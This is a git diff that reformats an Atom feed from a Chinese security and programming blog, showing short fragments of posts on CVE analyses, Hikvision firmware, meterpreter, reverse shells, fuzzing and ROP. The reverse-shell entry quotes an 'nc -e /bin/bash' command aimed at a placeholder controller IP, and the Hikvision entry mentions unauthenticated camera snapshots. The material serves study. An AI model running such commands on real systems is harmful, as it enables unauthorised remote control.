+&lt;p&gt;CVE-2023-40477 的漏洞应该是可以被避免的，存储数组索引的数据，应该使用 unsigned 类型，并且在通过不可信任的数据，访问数组时候需要检查边界。而 CVE-2023-38831 则是碰上了一个逻辑问题，在比较字符串时候没有比较长度。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;Refs&quot;&gt;Refs&lt;&#x2F;h2&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.win-rar.com&#x2F;singlenewsview.html?&amp;amp;L=0&amp;amp;tx_ttnews%5Btt_news%5D=232&amp;amp;cHash=c5bf79590657e32554c6683296a8e8aa&quot;&gt;WinRAR 6.23 final released&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
@@ -134,14 +210,19 @@ index ecf6dd3..0138d0f 100644
 &lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.cnblogs.com&#x2F;GoodFish-&#x2F;archive&#x2F;2023&#x2F;09&#x2F;21&#x2F;17715977.html&quot;&gt;Winrar代码执行漏洞(CVE-2023-38831)的原理分析&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
 &lt;&#x2F;ul&gt;
 </content>
-	</entry>
-	<entry xml:lang="zh_CN">
-		<title>使用 Parser combinator 解析 METAR 报文</title>
-		<published>2023-05-21T00:00:00+00:00</published>
-		<updated>2023-05-21T00:00:00+00:00</updated>
-		<link rel="alternate" href="https://chenx6.github.io/post/parser_combinator/" type="text/html"/>
-		<id>https://chenx6.github.io/post/parser_combinator/</id>
-		<content type="html">&lt;p&gt;因为我是骑自行车上下班的，对风向和风速很敏感，然后我住的离机场比较近，于是我想通过机场的天气状况判断下我的通勤是否容易。在翻阅资料后，发现机场的天气是使用 METAR 报文进行发送的，所以我将尝试用 Parser combinator 对报文进行解析，来获得天气状况。&lt;&#x2F;p&gt;
+        
+    </entry>
+    <entry xml:lang="zh_CN">
+        <title>使用 Parser combinator 解析 METAR 报文</title>
+        <published>2023-05-21T00:00:00+00:00</published>
+        <updated>2023-05-21T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://chenx6.github.io/post/parser_combinator/" type="text/html"/>
+        <id>https://chenx6.github.io/post/parser_combinator/</id>
+        
+        <content type="html">&lt;p&gt;因为我是骑自行车上下班的，对风向和风速很敏感，然后我住的离机场比较近，于是我想通过机场的天气状况判断下我的通勤是否容易。在翻阅资料后，发现机场的天气是使用 METAR 报文进行发送的，所以我将尝试用 Parser combinator 对报文进行解析，来获得天气状况。&lt;&#x2F;p&gt;
 &lt;p&gt;本文采用的是 Python 进行编程，因为 Python 明显会比 Haskell 和 Rust 简单易读，Python 的缺点就是 lambda 函数很菜。&lt;&#x2F;p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;在写文章的时候发现我写的 parser 解析的信息不够完全，所以这个 parser 只供学习使用，请勿用于生产环境！&lt;&#x2F;p&gt;
@@ -365,14 +446,19 @@ index ecf6dd3..0138d0f 100644
 &lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;metar-taf.com&#x2F;explanation&quot;&gt;This is how you read a METAR&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
 &lt;&#x2F;ul&gt;
 </content>
-	</entry>
-	<entry xml:lang="zh_CN">
-		<title>海康威视 固件格式&#x2F;历史漏洞 分析</title>
-		<published>2023-03-11T00:00:00+00:00</published>
-		<updated>2023-03-11T00:00:00+00:00</updated>
-		<link rel="alternate" href="https://chenx6.github.io/post/hikvision/" type="text/html"/>
-		<id>https://chenx6.github.io/post/hikvision/</id>
-		<content type="html">&lt;p&gt;高中时候曾经当过一段时间的脚本小子，通过 CVE-2017-7921 拿下过一波摄像头，体验了一把游戏看门狗里的感觉。所以在今天，在掌握了一定的技术之后，我将尝试对海康威视的固件进行重新分析。&lt;&#x2F;p&gt;
+        
+    </entry>
+    <entry xml:lang="zh_CN">
+        <title>海康威视 固件格式&#x2F;历史漏洞 分析</title>
+        <published>2023-03-11T00:00:00+00:00</published>
+        <updated>2023-03-11T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://chenx6.github.io/post/hikvision/" type="text/html"/>
+        <id>https://chenx6.github.io/post/hikvision/</id>
+        
+        <content type="html">&lt;p&gt;高中时候曾经当过一段时间的脚本小子，通过 CVE-2017-7921 拿下过一波摄像头，体验了一把游戏看门狗里的感觉。所以在今天，在掌握了一定的技术之后，我将尝试对海康威视的固件进行重新分析。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;固件格式&quot;&gt;固件格式&lt;&#x2F;h2&gt;
 &lt;p&gt;海康威视的固件可能有几种格式。在对文件开头进行 xor 运算之后，得到的文件开头如果是 0x484b5753(&amp;quot;HKWS&amp;quot;) 的话，那么固件本身是没有被加密的，可以通过文件头，得到固件中包含的文件名字和文件偏移。有一种格式是文件开头为 0x484b3230(HK20)，再通过 xor 运算解密后面的文件内容时，才会出现 0x484b5753 字段，如下图所示。&lt;&#x2F;p&gt;
 &lt;pre data-lang=&quot;txt&quot; class=&quot;language-txt z-code&quot;&gt;&lt;code class=&quot;language-txt&quot; data-lang=&quot;txt&quot;&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Magic: 484b3230, Size: 152, Checksum: 29ca, Count: 0
@@ -570,14 +656,19 @@ Obtain a camera snapshot without authentication:
 &lt;li&gt;&lt;a href=&quot;http:&#x2F;&#x2F;www.f0und.icu&#x2F;article&#x2F;31.html&quot;&gt;hikvision CVE-2021-36260 分析以及教训&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
 &lt;&#x2F;ul&gt;
 </content>
-	</entry>
-	<entry xml:lang="zh_CN">
-		<title>QEMU 简易配置（CPU&#x2F;内存&#x2F;网络&#x2F;...）</title>
-		<published>2023-02-19T00:00:00+00:00</published>
-		<updated>2023-02-19T00:00:00+00:00</updated>
-		<link rel="alternate" href="https://chenx6.github.io/post/qemu/" type="text/html"/>
-		<id>https://chenx6.github.io/post/qemu/</id>
-		<content type="html">&lt;p&gt;从大学开始，我看过了一堆的 QEMU 配置的文章，这些文章要不就是从别的地方复制黏贴出来的，要不就是使用了已经停止维护的工具。所以我决定从网上找一手资料（QEMU Wiki，文档, man qemu，...）来写一篇文章来讲讲怎么简单的配置 QEMU 模拟虚拟机。在文章的最后放了最终运行的命令，大家复制了保存成脚本就可以使用，或者根据自己的要求来配置。（这个脚本已经经过 2 个人使用了，很好用 233）&lt;&#x2F;p&gt;
+        
+    </entry>
+    <entry xml:lang="zh_CN">
+        <title>QEMU 简易配置（CPU&#x2F;内存&#x2F;网络&#x2F;...）</title>
+        <published>2023-02-19T00:00:00+00:00</published>
+        <updated>2023-02-19T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://chenx6.github.io/post/qemu/" type="text/html"/>
+        <id>https://chenx6.github.io/post/qemu/</id>
+        
+        <content type="html">&lt;p&gt;从大学开始，我看过了一堆的 QEMU 配置的文章，这些文章要不就是从别的地方复制黏贴出来的，要不就是使用了已经停止维护的工具。所以我决定从网上找一手资料（QEMU Wiki，文档, man qemu，...）来写一篇文章来讲讲怎么简单的配置 QEMU 模拟虚拟机。在文章的最后放了最终运行的命令，大家复制了保存成脚本就可以使用，或者根据自己的要求来配置。（这个脚本已经经过 2 个人使用了，很好用 233）&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;CPU_配置&quot;&gt;CPU 配置&lt;&#x2F;h2&gt;
 &lt;p&gt;下面的选项开启 KVM 全虚拟化支持，能提升虚拟机的速度。&lt;&#x2F;p&gt;
 &lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash z-code&quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;z-source z-shell z-bash&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-shell&quot;&gt;&lt;span class=&quot;z-variable z-function z-shell&quot;&gt;--enable-kvm&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
@@ -652,14 +743,19 @@ dhcp-range=192.168.122.2,192.168.122.200
 &lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;wiki.qemu.org&#x2F;Documentation&#x2F;Networking&quot;&gt;https:&#x2F;&#x2F;wiki.qemu.org&#x2F;Documentation&#x2F;Networking&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
 &lt;&#x2F;ul&gt;
 </content>
-	</entry>
-	<entry xml:lang="zh_CN">
-		<title>meterpreter 简要分析</title>
-		<published>2022-10-23T00:00:00+00:00</published>
-		<updated>2022-10-23T00:00:00+00:00</updated>
-		<link rel="alternate" href="https://chenx6.github.io/post/meterpreter/" type="text/html"/>
-		<id>https://chenx6.github.io/post/meterpreter/</id>
-		<content type="html">&lt;p&gt;meterpreter 是 metasploit 里自带的一款远程控制工具，具有正向&#x2F;反向连接模式，并且功能强大，所以想分析下其实现。&lt;&#x2F;p&gt;
+        
+    </entry>
+    <entry xml:lang="zh_CN">
+        <title>meterpreter 简要分析</title>
+        <published>2022-10-23T00:00:00+00:00</published>
+        <updated>2022-10-23T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://chenx6.github.io/post/meterpreter/" type="text/html"/>
+        <id>https://chenx6.github.io/post/meterpreter/</id>
+        
+        <content type="html">&lt;p&gt;meterpreter 是 metasploit 里自带的一款远程控制工具，具有正向&#x2F;反向连接模式，并且功能强大，所以想分析下其实现。&lt;&#x2F;p&gt;
 &lt;ul&gt;
 &lt;li&gt;2022-10-23 初版博文发布&lt;&#x2F;li&gt;
 &lt;li&gt;2023-01-21 加入端口转发功能的实现分析&lt;&#x2F;li&gt;
@@ -974,14 +1070,19 @@ DEBUG:root:[*] sending response packet
 &lt;li&gt;&lt;a href=&quot;http:&#x2F;&#x2F;www.hick.org&#x2F;code&#x2F;skape&#x2F;papers&#x2F;meterpreter.pdf&quot;&gt;original specification&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
 &lt;&#x2F;ul&gt;
 </content>
-	</entry>
-	<entry xml:lang="zh_CN">
-		<title>通过无符号程序的日志函数来恢复函数名字</title>
-		<published>2022-07-24T00:00:00+00:00</published>
-		<updated>2022-07-24T00:00:00+00:00</updated>
-		<link rel="alternate" href="https://chenx6.github.io/post/from_log/" type="text/html"/>
-		<id>https://chenx6.github.io/post/from_log/</id>
-		<content type="html">&lt;p&gt;2023-03-12 更新：添加了使用 &lt;code&gt;ida_hexrays.decompile&lt;&#x2F;code&gt; 的方法&lt;&#x2F;p&gt;
+        
+    </entry>
+    <entry xml:lang="zh_CN">
+        <title>通过无符号程序的日志函数来恢复函数名字</title>
+        <published>2022-07-24T00:00:00+00:00</published>
+        <updated>2022-07-24T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://chenx6.github.io/post/from_log/" type="text/html"/>
+        <id>https://chenx6.github.io/post/from_log/</id>
+        
+        <content type="html">&lt;p&gt;2023-03-12 更新：添加了使用 &lt;code&gt;ida_hexrays.decompile&lt;&#x2F;code&gt; 的方法&lt;&#x2F;p&gt;
 &lt;p&gt;在逆向二进制程序中，经常碰到将程序 strip 了，但是日志函数中保留着函数名字的情况。所以写文记录在这种情况下，使用 IDAPython 恢复函数名字的过程。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;日志函数长什么样&quot;&gt;日志函数长什么样&lt;&#x2F;h2&gt;
 &lt;p&gt;下面是我手写的一个日志函数。主要有几个部分：&lt;&#x2F;p&gt;
@@ -1264,14 +1365,19 @@ DEBUG:root:[*] sending response packet
 &lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;blog.gentlecp.com&#x2F;article&#x2F;12309.html&quot;&gt;【IDAPython CTree】反编译代码操作练习&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
 &lt;&#x2F;ul&gt;
 </content>
-	</entry>
-	<entry xml:lang="zh_CN">
-		<title>使用编译原理的知识，用 Rust 写一个计算器</title>
-		<published>2022-06-02T00:00:00+00:00</published>
-		<updated>2022-06-02T00:00:00+00:00</updated>
-		<link rel="alternate" href="https://chenx6.github.io/post/calculator/" type="text/html"/>
-		<id>https://chenx6.github.io/post/calculator/</id>
-		<content type="html">&lt;p&gt;”想写个计算器“这件事情应该是我刚学会 C 语言时候的事情，当时还看不懂栈，逆波兰式等结构。但是现在不一样了，我不仅学过数据结构，还学过了编译原理。这次我就拿学过的编译原理相关知识写个计算器。&lt;&#x2F;p&gt;
+        
+    </entry>
+    <entry xml:lang="zh_CN">
+        <title>使用编译原理的知识，用 Rust 写一个计算器</title>
+        <published>2022-06-02T00:00:00+00:00</published>
+        <updated>2022-06-02T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://chenx6.github.io/post/calculator/" type="text/html"/>
+        <id>https://chenx6.github.io/post/calculator/</id>
+        
+        <content type="html">&lt;p&gt;”想写个计算器“这件事情应该是我刚学会 C 语言时候的事情，当时还看不懂栈，逆波兰式等结构。但是现在不一样了，我不仅学过数据结构，还学过了编译原理。这次我就拿学过的编译原理相关知识写个计算器。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;前置知识&quot;&gt;前置知识&lt;&#x2F;h2&gt;
 &lt;p&gt;上下文无关语法(CFG)：描述了语句是如何形成的。&lt;&#x2F;p&gt;
 &lt;p&gt;语句：从语法规则里推导出的一个符号串。&lt;&#x2F;p&gt;
@@ -1593,14 +1699,19 @@ Processed 9429 bytes, 0.009 megabytes (SI)
 &lt;p&gt;知乎上的大佬们推荐的这本《编译器设计》比龙书更加通俗易懂，贴近现实，强烈推荐！&lt;&#x2F;p&gt;
 &lt;&#x2F;blockquote&gt;
 </content>
-	</entry>
-	<entry xml:lang="zh_CN">
-		<title>关于 C 语言编译的那些破事</title>
-		<published>2022-05-21T00:00:00+00:00</published>
-		<updated>2022-05-21T00:00:00+00:00</updated>
-		<link rel="alternate" href="https://chenx6.github.io/post/compile_cheatsheet/" type="text/html"/>
-		<id>https://chenx6.github.io/post/compile_cheatsheet/</id>
-		<content type="html">&lt;p&gt;C 和 C++ 的编译是真的痛苦，会出现一堆离谱的问题。所以我特地写一篇文章讲一下这些破事，并且提供一些样例代码方便复制黏贴。&lt;&#x2F;p&gt;
+        
+    </entry>
+    <entry xml:lang="zh_CN">
+        <title>关于 C 语言编译的那些破事</title>
+        <published>2022-05-21T00:00:00+00:00</published>
+        <updated>2022-05-21T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://chenx6.github.io/post/compile_cheatsheet/" type="text/html"/>
+        <id>https://chenx6.github.io/post/compile_cheatsheet/</id>
+        
+        <content type="html">&lt;p&gt;C 和 C++ 的编译是真的痛苦，会出现一堆离谱的问题。所以我特地写一篇文章讲一下这些破事，并且提供一些样例代码方便复制黏贴。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;编译过程简述&quot;&gt;编译过程简述&lt;&#x2F;h2&gt;
 &lt;p&gt;在网上能找到一堆的编译流程相关的博客，而且肯定比我讲的正确，所以这里我就简单概括下。&lt;&#x2F;p&gt;
 &lt;p&gt;现在很少有程序能只依赖与 C 标准库和系统 API 了，所以会有一堆的外部依赖库。要想编译成功，得让编译器和链接器都知道去哪找这些库，怎么链接上。于是就有了一堆的编译管理工具。像 CMake 和 Meson 是负责生成编译的脚本，make 和 ninja 则是负责执行编译任务，然后是 gcc 和 clang 将代码编译成目标文件，最后有 ld, gold, mold 将目标文件进行链接生成可执行文件。&lt;&#x2F;p&gt;
@@ -1776,14 +1887,19 @@ executable(&amp;#39;client&amp;#39;, &amp;#39;src&#x2F;main_client.cpp&amp;#39;,
 &lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;wheybags&#x2F;glibc_version_header&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;wheybags&#x2F;glibc_version_header&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
 &lt;&#x2F;ul&gt;
 </content>
-	</entry>
-	<entry xml:lang="zh_CN">
-		<title>写一个可交互的反弹 Shell</title>
-		<published>2022-05-02T19:19:57+08:00</published>
-		<updated>2022-05-02T19:19:57+08:00</updated>
-		<link rel="alternate" href="https://chenx6.github.io/post/rev_pty/" type="text/html"/>
-		<id>https://chenx6.github.io/post/rev_pty/</id>
-		<content type="html">&lt;p&gt;在网上能看到一堆的反弹 Shell 方法，最常见的就是先用 &lt;code&gt;nc -e &#x2F;bin&#x2F;bash $控制机IP $控制机端口&lt;&#x2F;code&gt; 弹出一个 Shell，然后再用 &lt;code&gt;python3 -c &#x27;import pty; pty.spawn(&amp;quot;&#x2F;bin&#x2F;bash&amp;quot;)&#x27;&lt;&#x2F;code&gt; 这样来升级成交互式 Shell。这样的话得保证环境里有 nc + python，或者得在被控机上下载多个文件。这样的话，还不如直接自己写一个 Shell 呢 233。&lt;&#x2F;p&gt;
+        
+    </entry>
+    <entry xml:lang="zh_CN">
+        <title>写一个可交互的反弹 Shell</title>
+        <published>2022-05-02T19:19:57+08:00</published>
+        <updated>2022-05-02T19:19:57+08:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://chenx6.github.io/post/rev_pty/" type="text/html"/>
+        <id>https://chenx6.github.io/post/rev_pty/</id>
+        
+        <content type="html">&lt;p&gt;在网上能看到一堆的反弹 Shell 方法，最常见的就是先用 &lt;code&gt;nc -e &#x2F;bin&#x2F;bash $控制机IP $控制机端口&lt;&#x2F;code&gt; 弹出一个 Shell，然后再用 &lt;code&gt;python3 -c &#x27;import pty; pty.spawn(&amp;quot;&#x2F;bin&#x2F;bash&amp;quot;)&#x27;&lt;&#x2F;code&gt; 这样来升级成交互式 Shell。这样的话得保证环境里有 nc + python，或者得在被控机上下载多个文件。这样的话，还不如直接自己写一个 Shell 呢 233。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;“可交互_Shell”_的原理&quot;&gt;“可交互 Shell” 的原理&lt;&#x2F;h2&gt;
 &lt;p&gt;现在常见的“终端模拟器”，例如 KDE 的 Konsole, MACos 上的 iterm，服务器上的 SSH，都是使用 &amp;quot;pty&amp;quot; 来实现的。而我们反弹的 Shell 则不一样，所以无法交互。&lt;&#x2F;p&gt;
 &lt;p&gt;而 pty 则是模拟终端的设备。平时使用的终端模拟器是和 pty master 进行沟通，而里面的 shell 是和 pty slave 进行沟通，两者通过 pty 进行沟通。&lt;&#x2F;p&gt;
@@ -1923,14 +2039,19 @@ determine the terminal attributes and window size of the slave side of the pseud
 &lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;57518857&quot;&gt;linux select函数解析以及事例&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
 &lt;&#x2F;ul&gt;
 </content>
-	</entry>
-	<entry xml:lang="zh_CN">
-		<title>plt hook 项目代码分析和最小实现</title>
-		<published>2022-04-05T00:00:00+00:00</published>
-		<updated>2022-04-05T00:00:00+00:00</updated>
-		<link rel="alternate" href="https://chenx6.github.io/post/plthook/" type="text/html"/>
-		<id>https://chenx6.github.io/post/plthook/</id>
-		<content type="html">&lt;p&gt;虽然知道可以通过魔改 plt 表实现 hook 函数，但是不知道具体实现...碰巧最近用到了 plthook 这个库，于是我就研究了下 plthook 这个库，并且仿照着这个库重新实现一份代码。&lt;&#x2F;p&gt;
+        
+    </entry>
+    <entry xml:lang="zh_CN">
+        <title>plt hook 项目代码分析和最小实现</title>
+        <published>2022-04-05T00:00:00+00:00</published>
+        <updated>2022-04-05T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://chenx6.github.io/post/plthook/" type="text/html"/>
+        <id>https://chenx6.github.io/post/plthook/</id>
+        
+        <content type="html">&lt;p&gt;虽然知道可以通过魔改 plt 表实现 hook 函数，但是不知道具体实现...碰巧最近用到了 plthook 这个库，于是我就研究了下 plthook 这个库，并且仿照着这个库重新实现一份代码。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;原理分析&quot;&gt;原理分析&lt;&#x2F;h2&gt;
 &lt;p&gt;根据命名规则，.rela.plt 表是负责 plt 表的重定位信息。.rela 表中有每项都有 2 个成员，r_offset 指向了该重定位入口所要修正的位置的第一个字节的虚拟地址， r_info 则是表示相关信息，可以通过 &lt;code&gt;ELF[32|64]_R_SYM&lt;&#x2F;code&gt; 获得其指向的 .dynsym 项的下标。&lt;&#x2F;p&gt;
 &lt;p&gt;.dynsym 表（动态链接表）中存放动态链接需要的信息，可以通过 .dynsym 表从 .strtab 表中获得要链接的函数名字。&lt;&#x2F;p&gt;
@@ -2032,14 +2153,19 @@ determine the terminal attributes and window size of the slave side of the pseud
 &lt;li&gt;&lt;a href=&quot;http:&#x2F;&#x2F;chuquan.me&#x2F;2018&#x2F;05&#x2F;21&#x2F;elf-introduce&#x2F;&quot;&gt;计算机那些事(4)——ELF文件结构&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
 &lt;&#x2F;ul&gt;
 </content>
-	</entry>
-	<entry xml:lang="zh_CN">
-		<title>Frida 在一次离谱比赛中的应用</title>
-		<published>2022-02-26T00:00:00+00:00</published>
-		<updated>2022-02-26T00:00:00+00:00</updated>
-		<link rel="alternate" href="https://chenx6.github.io/post/frida_beginner/" type="text/html"/>
-		<id>https://chenx6.github.io/post/frida_beginner/</id>
-		<content type="html">&lt;p&gt;在某次离谱比赛中，我使用了 Frida 解出了题目，下面是一些简单的笔记。&lt;&#x2F;p&gt;
+        
+    </entry>
+    <entry xml:lang="zh_CN">
+        <title>Frida 在一次离谱比赛中的应用</title>
+        <published>2022-02-26T00:00:00+00:00</published>
+        <updated>2022-02-26T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://chenx6.github.io/post/frida_beginner/" type="text/html"/>
+        <id>https://chenx6.github.io/post/frida_beginner/</id>
+        
+        <content type="html">&lt;p&gt;在某次离谱比赛中，我使用了 Frida 解出了题目，下面是一些简单的笔记。&lt;&#x2F;p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;在 2021 年 10 月 24 日，我浪费了2小时的时间解出了一个某弹幕网站办的比赛的离谱安卓题，解出之后的内心就是：rnm，退时间！更加嘲讽的是，他还在一个月后转给了我 0.56 元作为奖励！&lt;&#x2F;p&gt;
 &lt;p&gt;那天比较欣慰的是在某弹幕网站上看完了 A·ZU·NA 的 FMT（&lt;&#x2F;p&gt;
@@ -2366,14 +2492,19 @@ determine the terminal attributes and window size of the slave side of the pseud
 &lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.cnblogs.com&#x2F;shlyd&#x2F;p&#x2F;14726850.html&quot;&gt;使用 Frida Hook 不同类型的函数（失效文章）&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
 &lt;&#x2F;ul&gt;
 </content>
-	</entry>
-	<entry xml:lang="zh_CN">
-		<title>记录一次失败的固件 fuzz</title>
-		<published>2021-01-21T00:00:00+00:00</published>
-		<updated>2021-01-21T00:00:00+00:00</updated>
-		<link rel="alternate" href="https://chenx6.github.io/post/fail_firm_fuzz/" type="text/html"/>
-		<id>https://chenx6.github.io/post/fail_firm_fuzz/</id>
-		<content type="html">&lt;p&gt;这是我第一次对华硕路由器的 httpd 进行 fuzz。结果 fuzz 出来的结果没有经过实机测试，就提交上去了，然后就是华硕的安全团队复现不出来...为什么复现不出来，在本文总结处进行分析。本文主要讲我在进行固件 fuzz 时的具体过程。&lt;&#x2F;p&gt;
+        
+    </entry>
+    <entry xml:lang="zh_CN">
+        <title>记录一次失败的固件 fuzz</title>
+        <published>2021-01-21T00:00:00+00:00</published>
+        <updated>2021-01-21T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://chenx6.github.io/post/fail_firm_fuzz/" type="text/html"/>
+        <id>https://chenx6.github.io/post/fail_firm_fuzz/</id>
+        
+        <content type="html">&lt;p&gt;这是我第一次对华硕路由器的 httpd 进行 fuzz。结果 fuzz 出来的结果没有经过实机测试，就提交上去了，然后就是华硕的安全团队复现不出来...为什么复现不出来，在本文总结处进行分析。本文主要讲我在进行固件 fuzz 时的具体过程。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;代码分析&#x2F;逆向工程&quot;&gt;代码分析&#x2F;逆向工程&lt;&#x2F;h2&gt;
 &lt;p&gt;华硕路由器的大部分源代码是公开的，可以在官网上下载到，并且有个开源的 &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;RMerl&#x2F;asuswrt-merlin.ng&quot;&gt;RMerl&#x2F;asuswrt-merlin.ng&lt;&#x2F;a&gt;。阅读源代码发现， httpd 的源代码中间调用了些博通的库，没法直接用编译器进行插桩。所以就当作源码不存在，直接下载二进制文件进行无文件 fuzz 了...&lt;&#x2F;p&gt;
 &lt;blockquote&gt;
@@ -2567,14 +2698,19 @@ determine the terminal attributes and window size of the slave side of the pseud
 &lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;AFLplusplus&#x2F;AFLplusplus&quot;&gt;AFLplusplus&#x2F;AFLplusplus&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
 &lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;fuzzing&quot;&gt;google&#x2F;fuzzing&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
 </content>
-	</entry>
-	<entry xml:lang="zh_CN">
-		<title>重写 OLLVM 之控制流平坦化</title>
-		<published>2021-01-21T00:00:00+00:00</published>
-		<updated>2021-01-21T00:00:00+00:00</updated>
-		<link rel="alternate" href="https://chenx6.github.io/post/rewrite_ollvm_fla/" type="text/html"/>
-		<id>https://chenx6.github.io/post/rewrite_ollvm_fla/</id>
-		<content type="html">&lt;p&gt;OLLVM 的控制流平坦化是逆向老哥最讨厌的混淆了，因为一旦使用就代表着 IDA 的 decompiler 彻底报废了。所以了解并在&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;chenx6&#x2F;baby_obfuscator&quot;&gt;自己的项目中&lt;&#x2F;a&gt;重写控制流平坦化挺重要的。&lt;&#x2F;p&gt;
+        
+    </entry>
+    <entry xml:lang="zh_CN">
+        <title>重写 OLLVM 之控制流平坦化</title>
+        <published>2021-01-21T00:00:00+00:00</published>
+        <updated>2021-01-21T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://chenx6.github.io/post/rewrite_ollvm_fla/" type="text/html"/>
+        <id>https://chenx6.github.io/post/rewrite_ollvm_fla/</id>
+        
+        <content type="html">&lt;p&gt;OLLVM 的控制流平坦化是逆向老哥最讨厌的混淆了，因为一旦使用就代表着 IDA 的 decompiler 彻底报废了。所以了解并在&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;chenx6&#x2F;baby_obfuscator&quot;&gt;自己的项目中&lt;&#x2F;a&gt;重写控制流平坦化挺重要的。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;什么是控制流平坦化&quot;&gt;什么是控制流平坦化&lt;&#x2F;h2&gt;
 &lt;h3 id=&quot;名词解释&quot;&gt;名词解释&lt;&#x2F;h3&gt;
 &lt;h4 id=&quot;BasicBlock&quot;&gt;BasicBlock&lt;&#x2F;h4&gt;
@@ -2796,14 +2932,19 @@ storeRng&lt;span class=&quot;z-punctuation z-accessor z-arrow z-c++&quot;&gt;-&a
 &lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;security.tencent.com&#x2F;index.php&#x2F;blog&#x2F;msg&#x2F;112&quot;&gt;利用符号执行去除控制流平坦化&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
 &lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;cq674350529&#x2F;deflat&quot;&gt;cq674350529&#x2F;deflat&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
 </content>
-	</entry>
-	<entry xml:lang="zh_CN">
-		<title>不同视角看 ROP</title>
-		<published>2020-06-01T00:00:00+00:00</published>
-		<updated>2020-06-01T00:00:00+00:00</updated>
-		<link rel="alternate" href="https://chenx6.github.io/post/different-rop/" type="text/html"/>
-		<id>https://chenx6.github.io/post/different-rop/</id>
-		<content type="html">&lt;p&gt;看了许多讲 ROP 的文章，发现很多只是讲了怎么利用，但是没有讲为什么这么利用。所以写文记录。&lt;&#x2F;p&gt;
+        
+    </entry>
+    <entry xml:lang="zh_CN">
+        <title>不同视角看 ROP</title>
+        <published>2020-06-01T00:00:00+00:00</published>
+        <updated>2020-06-01T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://chenx6.github.io/post/different-rop/" type="text/html"/>
+        <id>https://chenx6.github.io/post/different-rop/</id>
+        
+        <content type="html">&lt;p&gt;看了许多讲 ROP 的文章，发现很多只是讲了怎么利用，但是没有讲为什么这么利用。所以写文记录。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;什么是_ROP&quot;&gt;什么是 ROP&lt;&#x2F;h2&gt;
 &lt;p&gt;ROP (Return orient programming) 是一种漏洞利用方法，使得攻击者绕过保护(例如 NX 栈不可执行)执行恶意代码。攻击者通过栈溢出等手段实现覆盖返回地址劫持程序控制流，并且通过不同的代码片段(Gadgets)来拼接出攻击者希望执行的代码。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;怎么进行_ROP&quot;&gt;怎么进行 ROP&lt;&#x2F;h2&gt;
@@ -3000,14 +3141,19 @@ _add ENDP
